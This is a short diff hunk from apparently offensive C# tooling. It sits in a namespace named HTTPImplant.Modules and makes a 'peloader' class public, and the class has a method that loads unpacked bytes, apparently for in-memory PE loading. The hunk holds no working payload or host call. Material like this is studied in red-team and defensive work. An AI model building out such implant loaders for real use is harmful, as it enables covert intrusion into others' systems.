@@ -15,7 +15,7 @@ Provided for: Carlos Roque and Genesis Resto
 
 namespace HTTPImplant.Modules
 {
-    class peloader
+    public class peloader
     {
         public static void load(byte[] unpacked)
         {
